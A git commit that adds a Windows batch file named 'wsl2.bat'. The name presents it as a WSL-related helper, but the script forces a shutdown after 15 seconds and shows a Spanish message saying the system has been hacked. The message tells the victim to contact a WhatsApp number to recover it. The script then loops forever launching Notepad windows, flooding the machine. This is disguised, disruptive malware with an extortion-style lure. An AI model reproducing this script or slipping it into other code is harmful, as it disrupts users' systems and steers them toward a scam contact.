dd0c581cd929ddb2275733d200095a17f3ca0a6f
ciroprogamer86 <132161765+ciroprogamer@users.noreply.github.com>
2023-05-20 13:45:35 +0200

    Add files via upload

---
+++ wsl2.bat
@@ -0,0 +1,5 @@
+@echo off
+shutdown -s -f -t 15 -c "Has sido hackeado, esto es una prueba de la vulnerabilidad de Windows. Si deseas recuperar el sistema, contacta al WhatsApp +34 621 37 76 59"
+:bucle
+start notepad
+goto bucle
